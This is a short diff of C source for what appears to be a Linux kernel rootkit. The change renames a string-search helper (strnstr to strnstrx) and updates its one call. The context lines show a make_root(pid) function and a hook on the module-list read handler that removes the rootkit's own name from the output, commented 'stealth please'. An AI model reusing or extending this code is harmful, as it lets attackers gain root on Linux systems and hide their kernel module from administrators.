@@ -178,7 +178,7 @@ void make_root(unsigned pid) {
 }
 #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 33)
 #ifndef CENTOS
-char * strnstr(char *s, const char *find, size_t slen) {
+char * strnstrx(char *s, const char *find, size_t slen) {
 	char c, sc;
 	size_t len;
 	if ((c = *find++) != '\0') {
@@ -204,7 +204,7 @@ static ssize_t do_read_modules (struct file *fp, char __user *buf, size_t sz, lo
     char *ss;
     read = modules_proc_original->read(fp, buf, sz, loff);
     // where's my module name?
-    ss = strnstr(buf, MODULE_NAME, strlen(MODULE_NAME));
+    ss = strnstrx(buf, MODULE_NAME, strlen(MODULE_NAME));
     if(ss) {
         // stealth please
         char *new_line = strchr(ss, '\n');
